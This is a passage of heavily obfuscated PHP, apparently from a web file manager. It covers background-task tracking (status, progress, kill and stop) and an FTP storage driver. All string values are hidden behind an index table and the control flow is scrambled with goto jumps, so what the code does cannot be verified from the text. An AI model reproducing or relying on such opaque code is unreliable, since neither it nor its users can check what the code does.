($E•ù»»­Ñ) { $E•ù»»­Ñ->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($EŠÍ‡´ƒêó[1510], $EŠÍ‡´ƒêó[1511]); die; } goto fõ·‘‹æå; fõ·‘‹æå: } public static function taskRun($eŠáßãñá) { goto e—´¥Ô†Ÿƒ; cîŞî°»Î–: $aèœ§½³³ = timeFloat(); $b™ƒ¬Ÿé¬× = $Aù¶ÍÚ½ó¨[33]; switch ($eŠáßãñá[$Aù¶ÍÚ½ó¨[29]]) { case $Aù¶ÍÚ½ó¨[304]: $bƒö›²•™Ü = url_request($eŠáßãñá[$Aù¶ÍÚ½ó¨[1515]], $Aù¶ÍÚ½ó¨[227], !1, !1, !1, !1, 5); $b™ƒ¬Ÿé¬× = strlen($bƒö›²•™Ü); break; case $Aù¶ÍÚ½ó¨[226]: $b™ƒ¬Ÿé¬× = Hook::apply($eŠáßãñá[$Aù¶ÍÚ½ó¨[1515]]); default: break; } goto BÓ¢ÔÅ¢¿Ç; BÓ¢ÔÅ¢¿Ç: Model($Aù¶ÍÚ½ó¨[1516])->add(array($Aù¶ÍÚ½ó¨[1517] => $Aù¶ÍÚ½ó¨[33], $Aù¶ÍÚ½ó¨[1518] => $Aù¶ÍÚ½ó¨[495], $Aù¶ÍÚ½ó¨[29] => $Aù¶ÍÚ½ó¨[1519] . $eŠáßãñá[$Aù¶ÍÚ½ó¨[392]], $Aù¶ÍÚ½ó¨[1520] => json_encode(array($Aù¶ÍÚ½ó¨[28] => $eŠáßãñá[$Aù¶ÍÚ½ó¨[28]], $Aù¶ÍÚ½ó¨[1521] => timeFloat() - $aèœ§½³³, $Aù¶ÍÚ½ó¨[290] => $b™ƒ¬Ÿé¬×)))); self::log($Aù¶ÍÚ½ó¨[1522] . $eŠáßãñá[$Aù¶ÍÚ½ó¨[392]] . $Aù¶ÍÚ½ó¨[1523] . $b™ƒ¬Ÿé¬×); return !0; goto f÷§¶¨ƒôŠ; e—´¥Ô†Ÿƒ: $Aù¶ÍÚ½ó¨ =& $_SERVER[´¬]; self::log($Aù¶ÍÚ½ó¨[1512] . $eŠáßãñá[$Aù¶ÍÚ½ó¨[392]] . $Aù¶ÍÚ½ó¨[1513] . $eŠáßãñá[$Aù¶ÍÚ½ó¨[28]] . $Aù¶ÍÚ½ó¨[1514] . $eŠáßãñá[$Aù¶ÍÚ½ó¨[1515]]); Model($Aù¶ÍÚ½ó¨[1496])->run($eŠáßãñá[$Aù¶ÍÚ½ó¨[392]]); goto cîŞî°»Î–; f÷§¶¨ƒôŠ: } private static function valueGet($FÃ‘¥Ñ¾ß·) { $EµĞÂÕïå =& $_SERVER[´¬]; $B×êåœîğŞ = $EµĞÂÕïå[1524]; $B“Ğ‚«Î¬ = Model($EµĞÂÕïå[1525])->get($FÃ‘¥Ñ¾ß·, $B×êåœîğŞ); if (is_null($B“Ğ‚«Î¬)) { Model($EµĞÂÕïå[1525])->set($EµĞÂÕïå[713], $EµĞÂÕïå[87], $B×êåœîğŞ); Model($EµĞÂÕïå[1525])->set($EµĞÂÕïå[1490], $EµĞÂÕïå[495], $B×êåœîğŞ); $B“Ğ‚«Î¬ = Model($EµĞÂÕïå[1525])->get($FÃ‘¥Ñ¾ß·, $B×êåœîğŞ); } return $B“Ğ‚«Î¬; } private static function valueSet($AÌêŒŒÌÉ¸, $A‹Ğµö·Ü) { $BòÒ†‰´© =& $_SERVER[´¬]; return Model($BòÒ†‰´©[1525])->set($AÌêŒŒÌÉ¸, $A‹Ğµö·Ü, $BòÒ†‰´©[1524]); } protected static function log($e—Á¡ÔãŞô) { write_log($e—Á¡ÔãŞô, $_SERVER[´¬][1511]); } private static function cacheClear() { $eØÀè£ó‹¬ =& $_SERVER[´¬]; $Cˆ‡ˆ”Ÿ  = Model($eØÀè£ó‹¬[1525])->cacheKey($eØÀè£ó‹¬[1524]); Cache::clearMemory($Cˆ‡ˆ”Ÿ ); Model($eØÀè£ó‹¬[1496])->cacheClear(); } } class Task { const STATYS_STOP = "\x73\x74\x6f\x70"; const STATYS_RUNNING = "\x72\165\156\156\x69\x6e\147"; const STATYS_KILL = "\153\151\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($bŞË“êâßæ, $cÊğ¾‹áÁí = '', $cŒ±Ÿ®à…× = 0, $BØ Õ‘µñ = '') { goto Dñæºµˆ¯; cÈ†å“á•: $GLOBALS[$C™‚Ö¦º›Ê[1532]] = 1; Hook::bind($C™‚Ö¦º›Ê[1492], array($this, $C™‚Ö¦º›Ê[1533])); Hook::bind($C™‚Ö¦º›Ê[1534], array($this, $C™‚Ö¦º›Ê[1535])); goto eˆ±Ûœïï³; eˆ±Ûœïï³: $this->startAfter(); Hook::trigger($C™‚Ö¦º›Ê[1536], $this->task); $this->task[$C™‚Ö¦º›Ê[1529]] = timeFloat(); goto F—Ê¦ğä»£; Dñæºµˆ¯: $C™‚Ö¦º›Ê =& $_SERVER[´¬]; if (self::get($bŞË“êâßæ)) { return; } $this->task = array($C™‚Ö¦º›Ê[392] => $bŞË“êâßæ, $C™‚Ö¦º›Ê[1526] => USER_ID, $C™‚Ö¦º›Ê[1432] => $BØ Õ‘µñ, $C™‚Ö¦º›Ê[29] => $cÊğ¾‹áÁí, $C™‚Ö¦º›Ê[1024] => $C™‚Ö¦º›Ê[33], $C™‚Ö¦º›Ê[1022] => $cŒ±Ÿ®à…×, $C™‚Ö¦º›Ê[1037] => 0, $C™‚Ö¦º›Ê[1527] => 0, $C™‚Ö¦º›Ê[1528] => 0, $C™‚Ö¦º›Ê[749] => timeFloat(), $C™‚Ö¦º›Ê[748] => 0, $C™‚Ö¦º›Ê[1529] => 0, $C™‚Ö¦º›Ê[1530] => 0, $C™‚Ö¦º›Ê[1531] => 0, $C™‚Ö¦º›Ê[713] => $C™‚Ö¦º›Ê[1490]); goto cÈ†å“á•; F—Ê¦ğä»£: } public function end() { goto AÄÊÍ“’Õ‹; DáäïÍà: $f…¤åß²ô = timeFloat() - $this->task[$Bœçœ‰±¨Š[749]]; self::log($Bœçœ‰±¨Š[1537] . $this->task[$Bœçœ‰±¨Š[392]] . $Bœçœ‰±¨Š[1538] . $f…¤åß²ô . $Bœçœ‰±¨Š[1539]); Hook::unbind($Bœçœ‰±¨Š[1492], array($this, $Bœçœ‰±¨Š[1533])); goto eÕ›éÕ…‰; AÄÊÍ“’Õ‹: $Bœçœ‰±¨Š =& $_SERVER[´¬]; if (!$this->task) { return; } if ($this->task[$Bœçœ‰±¨Š[1529]]) { self::valueSet($this->task[$Bœçœ‰±¨Š[392]], !1); } goto DáäïÍà; eÕ›éÕ…‰: Hook::unbind($Bœçœ‰±¨Š[1534], array($this, $Bœçœ‰±¨Š[1535])); $this->endAfter(); $this->task = !1; goto C˜–ª“®£Ä; C˜–ª“®£Ä: } public function update($DóÃ’º¶Ø = 0, $DŞõ‰¹ââí = false) { goto cÓâˆĞ­¯; cÓâˆĞ­¯: $c³Îí©¡ç =& $_SERVER[´¬]; $DÅÒ–ã¤£ =& $this->task; if (!$DÅÒ–ã¤£) { return; } goto AÊóã’¼; eªÂÏÁÒ¯: $DÅÒ–ã¤£[$c³Îí©¡ç[713]] = $f£ï·ã¶Ş¹ ? $f£ï·ã¶Ş¹ : $DÅÒ–ã¤£[$c³Îí©¡ç[713]]; $DÅÒ–ã¤£[$c³Îí©¡ç[1530]] = $e„Õœƒ –[$c³Îí©¡ç[1530]] ? $e„Õœƒ –[$c³Îí©¡ç[1530]] : 0; $DÅÒ–ã¤£[$c³Îí©¡ç[1529]] = timeFloat(); goto DåÈØ¾ŠØí; AÊóã’¼: $DÅÒ–ã¤£[$c³Îí©¡ç[1037]] += $DóÃ’º¶Ø; $DÅÒ–ã¤£[$c³Îí©¡ç[748]] = timeFloat(); if ($DÅÒ–ã¤£[$c³Îí©¡ç[1022]]) { if ($DÅÒ–ã¤£[$c³Îí©¡ç[1022]] < $DÅÒ–ã¤£[$c³Îí©¡ç[1037]]) { $DÅÒ–ã¤£[$c³Îí©¡ç[1022]] = $DÅÒ–ã¤£[$c³Îí©¡ç[1037]]; } $c…Âİ»ê»´ = timeFloat() - $DÅÒ–ã¤£[$c³Îí©¡ç[749]] - $DÅÒ–ã¤£[$c³Îí©¡ç[1530]]; $DÅÒ–ã¤£[$c³Îí©¡ç[1527]] = $DÅÒ–ã¤£[$c³Îí©¡ç[1037]] / $DÅÒ–ã¤£[$c³Îí©¡ç[1022]]; $DÅÒ–ã¤£[$c³Îí©¡ç[1528]] = $DÅÒ–ã¤£[$c³Îí©¡ç[1037]] / $c…Âİ»ê»´; if ($DÅÒ–ã¤£[$c³Îí©¡ç[1527]] > 0) { $DÅÒ–ã¤£[$c³Îí©¡ç[1531]] = $c…Âİ»ê»´ * (1 - $DÅÒ–ã¤£[$c³Îí©¡ç[1527]]) / $DÅÒ–ã¤£[$c³Îí©¡ç[1527]]; } $DÅÒ–ã¤£[$c³Îí©¡ç[1531]] = $DÅÒ–ã¤£[$c³Îí©¡ç[1531]] <= 0 ? 0 : $DÅÒ–ã¤£[$c³Îí©¡ç[1531]]; } goto aºğÓ±®Œ; DåÈØ¾ŠØí: Hook::trigger($c³Îí©¡ç[1543], $DÅÒ–ã¤£); self::valueSet($DÅÒ–ã¤£[$c³Îí©¡ç[392]], $DÅÒ–ã¤£); goto fÆîÂ©ÍÕ; aºğÓ±®Œ: $this->updateAfter(); $f­›Ù‡›¡´ = 0.2; if (timeFloat() - $DÅÒ–ã¤£[$c³Îí©¡ç[1529]] < $f­›Ù‡›¡´ && !$DŞõ‰¹ââí) { return; } goto fîàÃÚì †; fîàÃÚì †: $e„Õœƒ – = self::get($DÅÒ–ã¤£[$c³Îí©¡ç[392]]); $f£ï·ã¶Ş¹ = $e„Õœƒ –[$c³Îí©¡ç[713]]; if ($f£ï·ã¶Ş¹ == self::STATYS_KILL) { $bÇÜ…ªÖÃ = array($c³Îí©¡ç[1540] => LNG($c³Îí©¡ç[1541]), $c³Îí©¡ç[1087] => !1); Cache::set($c³Îí©¡ç[1542] . $this->task[$c³Îí©¡ç[392]], $bÇÜ…ªÖÃ, 30); $this->end(); die; } else { if ($f£ï·ã¶Ş¹ == self::STATYS_STOP) { $B¥ù–Ÿñ¼Æ = 2; $e„Õœƒ –[$c³Îí©¡ç[1530]] += $B¥ù–Ÿñ¼Æ; self::valueSet($DÅÒ–ã¤£[$c³Îí©¡ç[392]], $e„Õœƒ –); sleep($B¥ù–Ÿñ¼Æ); $this->update(); return; } } goto eªÂÏÁÒ¯; fÆîÂ©ÍÕ: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($b¹ÙÅßëŸˆ) { $a£ÇØØëê‘ =& $_SERVER[´¬]; Cache::set($a£ÇØØëê‘[1542] . $this->task[$a£ÇØØëê‘[392]], $b¹ÙÅßëŸˆ, 60); return $b¹ÙÅßëŸˆ; } public static function get($d—’£˜¡­) { return self::valueGet($d—’£˜¡­); } public static function listData() { $Bøùêñ¦¾ = self::valueGet(); return array_sort_by($Bøùêñ¦¾, $_SERVER[´¬][749], !0); } public static function kill($E‡Ÿ¡ÕÙœ›) { return self::changeStatus($E‡Ÿ¡ÕÙœ›, self::STATYS_KILL); } public static function stop($DˆÕ‹Ó—‡ù) { return self::changeStatus($DˆÕ‹Ó—‡ù, self::STATYS_STOP); } public static function restart($FÈà‹Ï‚¹™) { return self::changeStatus($FÈà‹Ï‚¹™, self::STATYS_RUNNING); } public static function killAll() { $dÛƒË›ÊÄ¸ =& $_SERVER[´¬]; $fÊ¦È³Ò¡í = self::listData(); foreach ($fÊ¦È³Ò¡í as $Açó¿ƒŒ´Ó) { self::kill($Açó¿ƒŒ´Ó[$dÛƒË›ÊÄ¸[392]]); } sleep(2); foreach ($fÊ¦È³Ò¡í as $Açó¿ƒŒ´Ó) { self::valueSet($Açó¿ƒŒ´Ó[$dÛƒË›ÊÄ¸[392]], !1); } } private static function changeStatus($b÷Æ–‘äÓ, $C‚Û¢Ê©ùî) { goto B²šÅ¤ºÑÙ; Bƒù‘¦…òÏ: return !0; goto dÍ£Ÿæ‡µÈ; F½ºóƒØÑ…: $F­âïêĞĞ—[$bô¹¸ãçİÜ[713]] = $C‚Û¢Ê©ùî; self::valueSet($b÷Æ–‘äÓ, $F­âïêĞĞ—); self::log($bô¹¸ãçİÜ[1544] . $F­âïêĞĞ—[$bô¹¸ãçİÜ[392]] . $bô¹¸ãçİÜ[1545] . $C‚Û¢Ê©ùî); goto Bƒù‘¦…òÏ; B²šÅ¤ºÑÙ: $bô¹¸ãçİÜ =& $_SERVER[´¬]; $F­âïêĞĞ— = self::valueGet($b÷Æ–‘äÓ); if (!$F­âïêĞĞ—) { return !1; } goto F½ºóƒØÑ…; dÍ£Ÿæ‡µÈ: } public static function valueGet($dï÷çáëİ = false) { $Fˆ¿“›ä…ì =& $_SERVER[´¬]; if ($dï÷çáëİ) { $FÁ„¥Æ»Úë = Model($Fˆ¿“›ä…ì[423])->where(array($Fˆ¿“›ä…ì[93] => $dï÷çáëİ, $Fˆ¿“›ä…ì[29] => $Fˆ¿“›ä…ì[1546]))->find(); return $FÁ„¥Æ»Úë ? json_decode($FÁ„¥Æ»Úë[$Fˆ¿“›ä…ì[371]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($B‚«•Š…£Á = false) { goto bõæƒŒ×‰Ø; E©ŸÊ’˜: $A•ÃÑ”Š¸ = Model($EÙÁ’‰Ìö¡[423])->where($c‘÷†ÕØ™)->select(); $A•ÃÑ”Š¸ = $A•ÃÑ”Š¸ ? $A•ÃÑ”Š¸ : array(); foreach ($A•ÃÑ”Š¸ as $F¨‚¢‹À => $F—ã˜äÉã) { $A•ÃÑ”Š¸[$F¨‚¢‹À] = json_decode($F—ã˜äÉã[$EÙÁ’‰Ìö¡[371]], !0); } goto b©»›Ìµº½; bõæƒŒ×‰Ø: $EÙÁ’‰Ìö¡ =& $_SERVER[´¬]; $c‘÷†ÕØ™ = array($EÙÁ’‰Ìö¡[29] => $EÙÁ’‰Ìö¡[1546]); if ($B‚«•Š…£Á) { $c‘÷†ÕØ™[$EÙÁ’‰Ìö¡[1526]] = $B‚«•Š…£Á; } goto E©ŸÊ’˜; b©»›Ìµº½: return $A•ÃÑ”Š¸; goto C©¬¶Ô‰à§; C©¬¶Ô‰à§: } public static function valueSet($DáÊºÕÂÉø, $F’ÖÅÅÖô‡) { goto a¹ŞñÚ’ÃÊ; a¹ŞñÚ’ÃÊ: $B„™¹‘’î± =& $_SERVER[´¬]; if (!$F’ÖÅÅÖô‡) { return Model($B„™¹‘’î±[423])->where(array($B„™¹‘’î±[93] => $DáÊºÕÂÉø, $B„™¹‘’î±[29] => $B„™¹‘’î±[1546]))->delete(); } $F±¼ºçÖø = json_encode($F’ÖÅÅÖô‡); goto EÛ„¨ÄËŒ; EÛ„¨ÄËŒ: if (!$F±¼ºçÖø) { ob_start(); var_dump($F’ÖÅÅÖô‡); $Fêäáğ¤ = ob_get_clean(); self::log($B„™¹‘’î±[1547] . json_encode_force($Fêäáğ¤)); } if (!$DáÊºÕÂÉø || !$F’ÖÅÅÖô‡[$B„™¹‘’î±[392]]) { return !1; } $A¡Ó¿öâ…œ = array($B„™¹‘’î±[29] => $B„™¹‘’î±[1546], $B„™¹‘’î±[1526] => USER_ID, $B„™¹‘’î±[93] => $DáÊºÕÂÉø, $B„™¹‘’î±[371] => $F±¼ºçÖø); goto b´ÆîòÙŠÃ; b´ÆîòÙŠÃ: Model($B„™¹‘’î±[423])->add($A¡Ó¿öâ…œ, array(), !0); goto fÛ¯»˜äª—; fÛ¯»˜äª—: } public static function log($aÁ‹ç“¤îƒ) { if (!GLOBAL_DEBUG) { return; } write_log($aÁ‹ç“¤îƒ, $_SERVER[´¬][1548]); } } goto B†‚‰ÀÉ‘Ë; BîÖ¢ª‘‘Ú: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($fá’ˆ‡Ñó) { parent::__construct(); if (count($fá’ˆ‡Ñó) > 0) { $this->_init($fá’ˆ‡Ñó); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($e¦çïà’àê) { $b­õñ¢—¨ =& $_SERVER[´¬]; global $config; $this->appCharset = $config[$b­õñ¢—¨[1242]]; $this->systemCharset = $config[$b­õñ¢—¨[1243]]; if (isset($e¦çïà’àê[$b­õñ¢—¨[1244]]) && $e¦çïà’àê[$b­õñ¢—¨[1244]]) { $this->systemCharset = $e¦çïà’àê[$b­õñ¢—¨[1244]]; } } public function iconvApp($Dòèä) { return $this->iconvTo($Dòèä, $this->systemCharset, $this->appCharset); } public function iconvSystem($Fç½æ£Æ°) { return $this->iconvTo($Fç½æ£Æ°, $this->appCharset, $this->systemCharset); } public function getPathOuter($Fí§î”¯Ä) { goto C¶¹†å•Œ‹; c¥¬Œ¬Ö’Ù: return $this->pathDriver . $E×‚´ÃœŠß[8] . ltrim($Fí§î”¯Ä, $E×‚´ÃœŠß[8]); goto EÌó½£´ç±; cä®ÃÎ–œ­: if (substr($FÛ—À¾ Îö, 0, 2) == $E×‚´ÃœŠß[1245]) { $FÛ—À¾ Îö = BASIC_PATH . substr($FÛ—À¾ Îö, 2); } if (substr($Fí§î”¯Ä, 0, 2) == $E×‚´ÃœŠß[1245]) { $Fí§î”¯Ä = BASIC_PATH . substr($Fí§î”¯Ä, 2); } $FÛ—À¾ Îö = KodIO::clear($FÛ—À¾ Îö); goto A­…Æ“ ´Ñ; C¶¹†å•Œ‹: $E×‚´ÃœŠß =& $_SERVER[´¬]; $FÛ—À¾ Îö = $this->iconvApp($this->pathBase); $Fí§î”¯Ä = $this->iconvApp($Fí§î”¯Ä); goto cä®ÃÎ–œ­; A­…Æ“ ´Ñ: $Fí§î”¯Ä = KodIO::clear($Fí§î”¯Ä); $Fí§î”¯Ä = substr($Fí§î”¯Ä, strlen($FÛ—À¾ Îö)); if (empty($this->pathDriver)) { return $Fí§î”¯Ä; } goto c¥¬Œ¬Ö’Ù; EÌó½£´ç±: } private function _init($f§õ÷¶°«Ê = array()) { $bÆÎ¤µœ =& $_SERVER[´¬]; if (!function_exists($bÆÎ¤µœ[1246])) { throw new Exception(LNG($bÆÎ¤µœ[1247])); } $this->config = $f§õ÷¶°«Ê; $this->charsetReset($f§õ÷¶°«Ê); foreach ($f§õ÷¶°«Ê as $CêËÁ’Î => $aíïñÕŞâ) { if (isset($this->{$CêËÁ’Î})) { $this->{$CêËÁ’Î} = $aíïñÕŞâ; } } return $this->_login($f§õ÷¶°«Ê); } private function _login($dœ¿ºä¾¬) { goto aº±ƒœŸÜ; dÓÂÂÛó”: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $CôõòÀ¨ˆ¶ = @ftp_login($this->connect, $this->username, $this->userpass); goto EÙ˜™‚×™«; D»”ºšÛÙ: $e¡œÏ Ïï½ = isset($c³£İåÜ£Û[$aèÁ÷Û¿‚[174]]) && $c³£İåÜ£Û[$aèÁ÷Û¿‚[174]] == $aèÁ÷Û¿‚[1248] ? !0 : !1; $this->scheme = $e¡œÏ Ïï½ ? $aèÁ÷Û¿‚[1249] : $aèÁ÷Û¿‚[1250]; $this->port = isset($c³£İåÜ£Û[$aèÁ÷Û¿‚[176]]) ? $c³£İåÜ£Û[$aèÁ÷Û¿‚[176]] : 21; goto dÓÂÂÛó”; EÙ˜™‚×™«: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $eïğµÅÀ = $this->pasv == $aèÁ÷Û¿‚[87] ? !0 : !1; @ftp_pasv($this->connect, $eïğµÅÀ); goto aŠáÅ¶Š; f¨¯à’¹: if (isset($d¼ÈŒÀÚÓô[$fôá‹­“±])) { foreach ($d¼ÈŒÀÚÓô[$fôá‹­“±] as $eîêß›ó™Š => $d¿ÜšòŒºâ) { $this->{$eîêß›ó™Š} = $d¿ÜšòŒºâ; } return !0; } $c³£İåÜ£Û = parse_url(trim($this->server, $aèÁ÷Û¿‚[8])); $this->host = $c³£İåÜ£Û[$aèÁ÷Û¿‚[175]]; goto D»”ºšÛÙ; aº±ƒœŸÜ: $aèÁ÷Û¿‚ =& $_SERVER[´¬]; static $d¼ÈŒÀÚÓô = array(); $fôá‹­“± = md5(json_encode($dœ¿ºä¾¬)); goto f¨¯à’¹; aŠáÅ¶Š: $d¼ÈŒÀÚÓô[$fôá‹­“±] = array($aèÁ÷Û¿‚[1251] => $this->connect, $aèÁ÷Û¿‚[175] => $this->host, $aèÁ÷Û¿‚[174] => $this->scheme, $aèÁ÷Û¿‚[176] => $this->port); return $CôõòÀ¨ˆ¶; goto BÜŸ†¡İŞÂ; BÜŸ†¡İŞÂ: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($DŠ‚™÷”™ğ, $b®Óò›õö = '', $dÕ§ï‘Î‘Ó = REPEAT_RENAME) { if ($this->setContent($DŠ‚™÷”™ğ, $b®Óò›õö)) { return $this->getPathOuter($DŠ‚™÷”™ğ); } return !1; } public function mkdir($A„‚“Ë¼µ, $BŞ«öÂ·ƒÖ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $A„‚“Ë¼µ = $this->iconvSystem($A„‚“Ë¼µ); if ($this->_isFolder($A„‚“Ë¼µ) || @ftp_mkdir($this->connect, $A„‚“Ë¼µ)) { return $this->getPathOuter($A„‚“Ë¼µ); } if (!$this->mkdir($this->pathFather($A„‚“Ë¼µ))) { return !1; } if ($A„‚“Ë¼µ = @ftp_mkdir($this->connect, $A„‚“Ë¼µ)) { return $this->getPathOuter($A„‚“Ë¼µ); } return !1; } public function copyFile($bì¹„àÊÊ, $F•Ş“Ú±³) { goto aÉ¯¬´°; d•õÜŒ¢¤Á: $this->tempFileRemve($e¤íœÏè…Ş); return $bÄ§¼ÎÀÚ; goto cà·„Œ¶; C‰Ò È¬ôˆ: $FÀ¿ôÀõÊ = $this->iconvApp($e¤íœÏè…Ş); $this->download($bì¹„àÊÊ, $FÀ¿ôÀõÊ); $bÄ§¼ÎÀÚ = $this->upload($F•Ş“Ú±³, $FÀ¿ôÀõÊ); goto d•õÜŒ¢¤Á; aÉ¯¬´°: if (!$this->_isconn()) { return !1; } $dä¨¬ºâµ = $this->pathThis($this->iconvSystem($bì¹„àÊÊ)); $e¤íœÏè…Ş = $this->tempFile($dä¨¬ºâµ); goto C‰Ò È¬ôˆ; cà·„Œ¶: } public function moveFile($BÔÈÇÆ¶éŸ, $d™ë‡çÈ§°) { if (!$this->_isconn()) { return !1; } $BÔÈÇÆ¶éŸ = $this->iconvSystem($BÔÈÇÆ¶éŸ); $d™ë‡çÈ§° = $this->iconvSystem($d™ë‡çÈ§°); $a†±ã°âÌÈ = @ftp_rename($this->connect, $BÔÈÇÆ¶éŸ, $d™ë‡çÈ§°); return $a†±ã°âÌÈ ? $this->getPathOuter($d™ë‡çÈ§°) : !1; } public function delFile($EŸò°™ÆÃà) { if (!$this->_isconn()) { return !1; } $EŸò°™ÆÃà = $this->iconvSystem($EŸò°™ÆÃà); return @ftp_delete($this->connect, $EŸò°™ÆÃà); } public function delFolder($A·«¸ÍÑŞå) { goto CÊ¶ŸåÁ´; CÊ¶ŸåÁ´: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $DùŠÑ˜Ë²¡ = $dªÂŠ ±‰ = array(); goto dÏ‰çõ‹­; Eá¯ˆŒ–: foreach ($DùŠÑ˜Ë²¡ as $D¬ÕÑšóŒ„) { $D¬ÕÑšóŒ„ = $this->iconvSystem($D¬ÕÑšóŒ„); $cî›Í¥Ş = @ftp_rmdir($this->connect, $D¬ÕÑšóŒ„); if (!$cî›Í¥Ş) { return !1; } } $A·«¸ÍÑŞå = $this->iconvSystem($A·«¸ÍÑŞå); return @ftp_rmdir($this->connect, $A·«¸ÍÑŞå); goto d‹Ï´¼¼ß­; dÏ‰çõ‹­: $this->fileList($A·«¸ÍÑŞå, $DùŠÑ˜Ë²¡, $dªÂŠ ±‰, !0); $this->listItemCache = !0; foreach ($dªÂŠ ±‰ as $c¾šçôŞŸ) { $D¬ÕÑšóŒ„ = $this->iconvSystem($c¾šçôŞŸ[$_SERVER[´¬][28]]); $cî›Í¥Ş = @ftp_delete($this->connect, $D¬ÕÑšóŒ„); if (!$cî›Í¥Ş) { return !1; } } goto Eá¯ˆŒ–; d‹Ï´¼¼ß­: } public function rename($D‚ñ·¬ÈŠ, $dÅ…°·¨Ó¸) { goto c•â•‡‰¥±; cĞĞ°¥ö¿³: $C²’ÄÏƒ˜± = $this->iconvSystem($C²’ÄÏƒ˜±); $D‚ñ·¬ÈŠ = $this->iconvSystem($D‚ñ·¬ÈŠ); $FÂÃ·ƒ®‡Œ = $this->pathFather($D‚ñ·¬ÈŠ); goto BËÏø³ Æ; cŒ”‰˜Ø­: return $d­ïõñ»· ? $this->getPathOuter($FÆ„§£çÛ) : !1; goto Dô˜ëÄ¤‚; c•â•‡‰¥±: $F‹„”‰Æ‰’ =& $_SERVER[´¬]; if (!$this->_isconn()) { return !1; } $C²’ÄÏƒ˜± = $this->fileNameAuto($this->pathFather($D‚ñ·¬ÈŠ), $dÅ…°·¨Ó¸); goto cĞĞ°¥ö¿³; BËÏø³ Æ: $FÆ„§£çÛ = rtrim($FÂÃ·ƒ®‡Œ, $F‹„”‰Æ‰’[8]) . $F‹„”‰Æ‰’[8] . $C²’ÄÏƒ˜±; $d­ïõñ»· = @ftp_rename($this->connect, $D‚ñ·¬ÈŠ, $FÆ„§£çÛ); $FÆ„§£çÛ = $this->iconvApp($FÆ„§£çÛ); goto cŒ”‰˜Ø­; Dô˜ëÄ¤‚: } private function folderInfo($a§™ÁƒÂƒ, $c¼ùŒ©”› = false) { $cº™ö‘âìÆ =& $_SERVER[´¬]; $béƒå›¾‡ô = array($cº™ö‘âìÆ[28] => $this->pathThis($a§™ÁƒÂƒ), $cº™ö‘âìÆ[76] => $this->getPathOuter($cº™ö‘âìÆ[8] . $a§™ÁƒÂƒ), $cº™ö‘âìÆ[29] => $cº™ö‘âìÆ[77]); if ($c¼ùŒ©”›) { return $béƒå›¾‡ô; } $béƒå›¾‡ô[$cº™ö‘âìÆ[193]] = $béƒå›¾‡ô[$cº™ö‘âìÆ[84]] = 0; $béƒå›¾‡ô[$cº™ö‘âìÆ[194]] = $béƒå›¾‡ô[$cº™ö‘âìÆ[195]] = !0; return $béƒå›¾‡ô; } private function fileInfo($F“ó¹ğ‚¾, $BŞö°ÖØé = false, $D¾¤™Çæ²¾ = array()) { goto c­µ‘×šÜ„; eœÅŞâ•: $b‰ó×ºªö[$Câ‰—…íÜ„[84]] = @ftp_mdtm($this->connect, $B„ê£äÛéÒ); if (empty($D¾¤™Çæ²¾)) { $D¾¤™Çæ²¾ = $this->objectMeta($F“ó¹ğ‚¾); if (!$D¾¤™Çæ²¾) { return $b‰ó×ºªö; } } $b‰ó×ºªö[$Câ‰—…íÜ„[78]] = $D¾¤™Çæ²¾[$Câ‰—…íÜ„[78]]; goto a–ÂâÓÙ×î; c­µ‘×šÜ„: $Câ‰—…íÜ„ =& $_SERVER[´¬]; $b‰ó×ºªö = array($Câ‰—…íÜ„[28] => $this->pathThis($F“ó¹ğ‚¾), $Câ‰—…íÜ„[76] => $this->getPathOuter($Câ‰—…íÜ„[8] . $F“ó¹ğ‚¾), $Câ‰—…íÜ„[29] => $Câ‰—…íÜ„[192], $Câ‰—…íÜ„[78] => isset($D¾¤™Çæ²¾[$Câ‰—…íÜ„[78]]) ? $D¾¤™Çæ²¾[$Câ‰—…íÜ„[78]] : 0, $Câ‰—…íÜ„[168] => $this->ext($F“ó¹ğ‚¾)); if ($BŞö°ÖØé) { return $b‰ó×ºªö; } goto C•‹‘›®; a–ÂâÓÙ×î: return $b‰ó×ºªö; goto e®·áİº†ƒ; C•‹‘›®: $b‰ó×ºªö[$Câ‰—…íÜ„[193]] = $b‰ó×ºªö[$Câ‰—…íÜ„[84]] = 0; $b‰ó×ºªö[$Câ‰—…íÜ„[194]] = $b‰ó×ºªö[$Câ‰—…íÜ„[195]] = !0; $B„ê£äÛéÒ = $this->iconvSystem($F“ó¹ğ‚¾); goto eœÅŞâ•; e®·áİº†ƒ: } public function size($AÖ–Ä‰½•¹) { $c…ìØÊõ† = $this->objectMeta($AÖ–Ä‰½•¹); return $c…ìØÊõ† ? $c…ìØÊõ†[$_SERVER[´¬][78]] : 0; } public function info($cÊÎìŒ•§Ù) { if ($this->isFile($cÊÎìŒ•§Ù)) { return $this->fileInfo($cÊÎìŒ•§Ù, 0); } else { if ($this->isFolder($cÊÎìŒ•§Ù)) { return $this->folderInfo($cÊÎìŒ•§Ù); } } return !1; } private function fileList($e…øÎ–òè†, &$c¡áíÀï›, &$eİ»ªŸœ•, $eñ•„Ä©ĞŸ = false) { goto C›§Œí½œ; d²Ê¸­«: @ftp_chdir($this->connect, $dÏ„´¤«Ó²[8]); $e…øÎ–òè† = rtrim($e…øÎ–òè†, $dÏ„´¤«Ó²[8]) . $dÏ„´¤«Ó²[8]; check_abort(); goto DËŠÅ÷®ô; cÙ”·çåØ‚: $e™Ä´ßœïŒ = array($dÏ„´¤«Ó²[95] => 1, $dÏ„´¤«Ó²[1252] => 1); foreach ($DÉÉŒçÜÄ– as $AİôÇ¯èæ˜) { goto cœøõ‘¤®; cœøõ‘¤®: $Bì‰Á“Ì›¡ = $this->_listItem($AİôÇ¯èæ˜); if ($Bì‰Á“Ì›¡[0] == $dÏ„´¤«Ó²[719]) { continue; } $d¯‚™ÅÆîà = 